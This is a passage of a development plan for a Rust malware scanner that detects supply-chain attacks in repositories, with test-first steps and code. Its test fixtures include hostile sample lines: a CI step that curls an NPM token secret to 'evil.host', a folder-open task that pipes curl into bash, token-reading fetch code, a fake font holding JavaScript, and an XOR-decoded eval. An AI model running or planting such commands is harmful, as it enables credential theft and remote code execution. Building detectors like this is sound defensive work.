        "global['r']=require;const x=String.fromCharCode(1,2,3,4,5);process.env.NPM_TOKEN;fetch('http://x')").unwrap();
    let files = WorkingTree::new(&repo);
    let f = scan_capabilities(&repo, &files);
    assert!(f.iter().any(|x| x.kind == FindingKind::Capability && x.file == Some(PathBuf::from("setup_bun.js"))));
}
#[test]
fn capability_clean_repo_silent() {
    let tmp = TempDir::new().unwrap();
    let repo = make_repo(&tmp);
    fs::write(repo.join("postcss.config.mjs"), "export default { plugins: {} };\n").unwrap();
    fs::write(repo.join("package.json"), r#"{"scripts":{"build":"vite build"}}"#).unwrap();
    let files = WorkingTree::new(&repo);
    assert!(scan_capabilities(&repo, &files).is_empty());
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core scanner::tests::capability`
Expected: FAIL — `scan_capabilities` not found.

- [ ] **Step 3: Implement `scan_capabilities`**

```rust
use crate::capability::{gate, is_exfil_staging, score};
use crate::surface::{classify, derived_targets, is_excluded_path, lifecycle_scripts, Surface};

fn cap_finding(repo: &Path, file: PathBuf, surface: Surface, s: &crate::capability::CapabilityScore) -> Finding {
    let top = s.evidence.first().cloned().unwrap_or_else(|| "capability".into());
    Finding {
        campaign: "generic".into(),
        severity: Severity::Critical,
        repo: repo.to_path_buf(),
        file: Some(file),
        signature_id: format!("capability:{surface:?}:{top}"),
        kind: FindingKind::Capability,
        evidence: format!("auto-run {surface:?}: {}", s.evidence.join(" + ")),
        remediable: false,
        online: None,
        git_ref: None,
    }
}

pub fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut score_unit = |findings: &mut Vec<Finding>, file: PathBuf, surface: Surface, content: &str| {
        let s = score(content, surface);
        if gate(surface, &s) { findings.push(cap_finding(repo, file, surface, &s)); }
    };

    for rel in files.paths() {
        if is_excluded_path(rel) { continue; }
        // File-backed surfaces
        if let Some(surface) = classify(rel) {
            if let Some(content) = files.read(rel) {
                // TasksJson precondition: only score if it has a folderOpen trigger;
                // treat a lone remote-fetch token as download_exec.
                if surface == Surface::TasksJson {
                    let low = content.to_lowercase();
                    if !(low.contains("folderopen") || low.contains("allowautomatictasks")) { continue; }
                }
                score_unit(&mut findings, rel.clone(), surface, &content);
                // Reachability: promote node ./X.js targets from lifecycle-adjacent surfaces
                if matches!(surface, Surface::WorkflowFile | Surface::TasksJson) {
                    for tgt in derived_targets(&content) {
                        let tp = PathBuf::from(&tgt);
                        if let Some(dc) = files.read(&tp) {
                            score_unit(&mut findings, tp, Surface::DerivedScript, &dc);
                        }
                    }
                }
            }
        }
        // package.json → LifecycleScript units + reachability
        if rel.file_name().map(|n| n == "package.json").unwrap_or(false) {
            if let Some(pj) = files.read(rel) {
                for (key, script) in lifecycle_scripts(&pj) {
                    let vfile = PathBuf::from(format!("{}#{}", rel.display(), key));
                    score_unit(&mut findings, vfile, Surface::LifecycleScript, &script);
                    for tgt in derived_targets(&script) {
                        let tp = PathBuf::from(&tgt);
                        if let Some(dc) = files.read(&tp) {
                            score_unit(&mut findings, tp, Surface::DerivedScript, &dc);
                        }
                    }
                }
            }
        }
        // ExfilStaging: root-level *.json
        if rel.parent().map(|p| p.as_os_str().is_empty()).unwrap_or(true)
            && rel.extension().map(|e| e == "json").unwrap_or(false) {
            if let Some(c) = files.read(rel) {
                if is_exfil_staging(&c) {
                    let mut s = crate::capability::CapabilityScore::default();
                    s.evidence.push("exfil-staging".into());
                    findings.push(cap_finding(repo, rel.clone(), Surface::ConfigFile, &s)); // surface label only
                }
            }
        }
    }

    // Working-tree .git/hooks pass (GitTree has none; guard on the physical dir existing)
    let hooks_dir = repo.join(".git/hooks");
    if hooks_dir.is_dir() {
        if let Ok(entries) = std::fs::read_dir(&hooks_dir) {
            for e in entries.flatten() {
                let p = e.path();
                if p.extension().map(|x| x == "sample").unwrap_or(false) { continue; }
                if let Ok(content) = std::fs::read_to_string(&p) {
                    let rel = p.strip_prefix(repo).unwrap_or(&p).to_path_buf();
                    score_unit(&mut findings, rel, Surface::GitHook, &content);
                }
            }
        }
    }
    findings
}
```

Wire into the scanners: in `scan_repo`, after `let mut findings = scan_files(...)`, add `findings.extend(scan_capabilities(repo, &working));`. In `deep_scan_repo`'s per-tree loop, after `let mut tree_findings = scan_files(repo, &tree, packs);`, add `tree_findings.extend(scan_capabilities(repo, &tree));` (before stamping `git_ref`). Add `scan_capabilities` to the `lib.rs` scanner re-export.

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core scanner::`
Expected: PASS (existing scanner tests still green + the 3 new ones).

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/scanner.rs crates/wormward-core/src/lib.rs
git commit -m "feat(core): scan_capabilities orchestration wired into scan_repo/deep_scan"
```

---

## Task 8: PolinRider analyzer — ESM shim marker

**Files:**
- Modify: `crates/wormward-packs/src/polinrider/analyzer.rs:6-10` (`marker_re`), `confirm`

**Interfaces:**
- Consumes: nothing new. Broadens existing regex.

- [ ] **Step 1: Write failing test** (add to analyzer tests)

```rust
#[test]
fn confirms_esm_shim_variant() {
    // require/module shim present, decoder present → confirm structurally
    let out = PolinriderAnalyzer.analyze(&scanned(
        "export default {};\nglobal['r']=require;global['m']=module;var _$_8e2c=[];"));
    assert_eq!(out.len(), 1);
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `cargo test -p wormward-packs confirms_esm_shim_variant`
Expected: FAIL — current `marker_re` only matches assignment to a quoted version string.

- [ ] **Step 3: Broaden `marker_re`**

```rust
fn marker_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // version-tag marker OR ESM re-entry shim (global['r']=require / global.m=module)
    RE.get_or_init(|| Regex::new(
        r"global(\.\w+|\['[^']+'\])\s*=\s*(?:require\b|module\b|'[\w-]+')"
    ).unwrap())
}
```

Also treat `createRequire(import.meta.url)` as a confirming decoder-equivalent token in `confirm`: change the `has_decoder` line to also accept it:

```rust
let has_decoder = decoder_re().is_match(content) || content.contains("MDy") || content.contains("createRequire(import.meta.url");
```

- [ ] **Step 4: Run to verify all analyzer tests pass**

Run: `cargo test -p wormward-packs polinrider`
Expected: PASS (existing marker/decoder/seed tests still green + new shim test).

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-packs/src/polinrider/analyzer.rs
git commit -m "feat(packs): confirm PolinRider ESM re-entry shim in analyzer"
```

---

## Task 9: Campaign-agnostic integration + clean-corpus regression

**Files:**
- Create: `crates/wormward-core/tests/capability_integration.rs`

**Interfaces:**
- Consumes: `wormward_core::{scan_capabilities, WorkingTree, FindingKind}`.

- [ ] **Step 1: Write the integration tests** (each builds a repo fixture and asserts fire/silence)

```rust
use std::fs;
use std::path::PathBuf;
use tempfile::TempDir;
use wormward_core::{scan_capabilities, FindingKind, WorkingTree};

fn repo_with(files: &[(&str, &str)]) -> (TempDir, PathBuf) {
    let tmp = TempDir::new().unwrap();
    let repo = tmp.path().join("proj");
    fs::create_dir_all(repo.join(".git")).unwrap();
    for (p, c) in files {
        let fp = repo.join(p);
        fs::create_dir_all(fp.parent().unwrap()).unwrap();
        fs::write(fp, c).unwrap();
    }
    (tmp, repo)
}
fn fires(files: &[(&str, &str)]) -> bool {
    let (_t, repo) = repo_with(files);
    let ft = WorkingTree::new(&repo);
    scan_capabilities(&repo, &ft).iter().any(|f| f.kind == FindingKind::Capability)
}

#[test] fn polinrider_config_injection() {
    assert!(fires(&[("postcss.config.mjs",
        "export default {};\nglobal.o='5-3-235-du';var _$_8e2c=[];fetch('https://x')")]));
}
#[test] fn shai_hulud_dropped_file_via_reachability() {
    assert!(fires(&[
        ("package.json", r#"{"scripts":{"preinstall":"node setup_bun.js"}}"#),
        ("setup_bun.js", "global['r']=require;String.fromCharCode(1,2,3,4,5);process.env.GITHUB_TOKEN;require('https')"),
    ]));
}
#[test] fn github_actions_secret_exfil() {
    assert!(fires(&[(".github/workflows/ci.yml",
        "on: push\njobs:\n  x:\n    steps:\n      - run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://evil.host")]));
}
#[test] fn tasksjacker_folderopen_curl_bash() {
    assert!(fires(&[(".vscode/tasks.json",
        "{\"tasks\":[{\"runOptions\":{\"runOn\":\"folderOpen\"},\"command\":\"curl http://x/t | bash\"}]}")]));
}
#[test] fn fake_font_is_js() {
    assert!(fires(&[("public/fonts/fa-solid-400.woff2", "var x=require('fs');eval(global['p'])")]));
}
#[test] fn propagation_bat() {
    assert!(fires(&[("temp_auto_push.bat",
        "git commit --amend --no-verify\ngit push -uf --no-verify")]));
}
#[test] fn exfil_staging_data_json() {
    assert!(fires(&[("data.json", "eyJhY2Nlc3MiOiJ0b2tlbiJ9\nZm9vYmFy==")]));
}
#[test] fn on_chain_c2() {
    assert!(fires(&[("next.config.js",
        "module.exports={};fetch('https://api.trongrid.io/v1/accounts/T/transactions').then(r=>{for(i in b)o+=String.fromCharCode(b.charCodeAt(i)^7);eval(o)})")]));
}

// --- clean-corpus regression ---
#[test] fn clean_repo_silent() {
    assert!(!fires(&[
        ("postcss.config.mjs", "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };\n"),
        ("vite.config.ts", "import { defineConfig } from 'vite';\nexport default defineConfig({ plugins: [] });\n"),
        ("package.json", r#"{"scripts":{"build":"vite build","test":"vitest","postinstall":"husky install"}}"#),
        ("src/index.js", "import App from './App';\nfetch('/api/data').then(r=>r.json());\nexport default App;\n"),
        (".github/workflows/ci.yml", "on: push\njobs:\n  test:\n    steps:\n      - run: npm ci && npm test\n"),
        ("scripts/deploy.sh", "#!/bin/sh\nset -e\nnpm run build\ngit push origin main\n"),
    ]));
}
```

- [ ] **Step 2: Run — expect fires-tests PASS, clean-test PASS**

Run: `cargo test -p wormward-core --test capability_integration`
Expected: all PASS. If `clean_repo_silent` fails, a detector is too loose — **tighten the offending detector/gate, do not loosen the assertion.** (Likely culprits: `husky install` in postinstall must not trip propagation/download-exec; `git push origin main` alone must not trip propagation; `src/index.js` with `fetch` must stay silent because obfuscation/trailing-code are both false.)

- [ ] **Step 3: Full suite + clippy**

Run: `cargo test --workspace && cargo clippy --workspace -- -D warnings`
Expected: green.

- [ ] **Step 4: Real-repo smoke (verification, not a unit test)**

Run: `cargo run -p wormward-cli -- scan /Users/fatihdevs/Desktop/wormward` (and one clean project root). Confirm zero capability findings on clean trees; eyeball output.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/tests/capability_integration.rs
git commit -m "test(core): campaign-agnostic capability integration + clean-corpus regression"
```

---

## Self-Review (against spec)

- **§4 surfaces** → Task 2 (`classify`) covers ConfigFile/WorkflowFile/TasksJson/GitHook/PropagationScript/BinaryAsset; LifecycleScript/DerivedScript synthesized in Tasks 3 & 7; entry files in Task 2. ✅
- **§5 capabilities** → Tasks 4 (obf/cred/net/spawn/magic) + 5 (download-exec/propagation/on-chain/trailing/wipe/exfil) + ESM shim in obfuscation (Task 4) and analyzer (Task 8). ✅
- **§6 reachability** → Task 3 (`derived_targets`) + Task 7 (promotion in `scan_capabilities`). ✅
- **§7 gate matrix** → Task 6. TasksJson folderOpen precondition + remote-fetch handling → Task 7 scanner note. ✅
- **§9 finding model** → Task 1 (kind) + Task 7 (`cap_finding`: campaign="generic", Critical, remediable=false). ✅
- **§10 analyzer** → Task 8. ✅
- **§8 FP strategy** → `is_excluded_path` (Task 2) + surface gate + clean-corpus test (Task 9). ✅
- **§11 tests** → Tasks 2–9 each TDD; integration + regression in Task 9. ✅

**Type consistency:** `Surface` variants, `CapabilityScore` field names, `score`/`gate`/`is_exfil_staging`/`scan_capabilities` signatures are identical across Tasks 2–9. `signature_id`/`campaign`/`kind` match §9.

**Open calibration risk (expected, handled in Task 9):** `trailing_code`, `on_chain_resolve`, and `propagation` heuristics are the most likely to need tightening against the clean-corpus test; the plan explicitly directs tightening the detector, never the assertion.
